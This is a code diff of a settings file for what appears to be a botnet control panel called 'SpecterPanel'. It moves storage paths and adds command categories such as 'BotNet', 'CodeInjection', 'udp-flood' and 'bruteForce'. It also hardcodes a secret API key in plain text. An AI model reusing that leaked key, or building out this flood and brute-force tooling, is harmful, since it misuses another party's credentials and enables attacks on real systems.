@@ -71,11 +71,13 @@ class Setting:
         )
 
         # Use temp directory to ensure writable location (for PyInstaller)
-        self.APP_DIR = os.path.join(tempfile.gettempdir(), "SpecterPanel")
+        # self.APP_DIR = os.path.join(tempfile.gettempdir(), "SpecterPanel")
 
         # Set up directory structure
-        self.DB_DIR = os.path.join(self.APP_DIR, "db")
-        self.LOG_DIR = os.path.join(self.APP_DIR, "logs")
+        # self.DB_DIR = os.path.join(self.APP_DIR, "db")
+        # self.LOG_DIR = os.path.join(self.APP_DIR, "logs")
+        self.DB_DIR = "db"
+        self.LOG_DIR = "logs"
 
         # Logging configuration
         self.LOG_FILE_NAME = "log.txt"
@@ -107,6 +109,8 @@ class Setting:
         self.CMD_CONDION = {True: "1", False: "0"}
         self.API_KEY_AI = "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"
         self.INSTRACTION = ['connectToWeb', 'connectBySocket', 'BotNet','codeInjection']
+        self.INSTRACTION_TYPE = ['CMD','BotNet','CodeInjection','Web','Socket']
+        self.INSTRACTION_BOTNET_CATEGORY = ['udp-flood','bruteForce']
         self.STUTAS = ['Active', 'Inactive']
         self.ACTION_TYPE = ['udp-flood','socket','bruteForce']
 
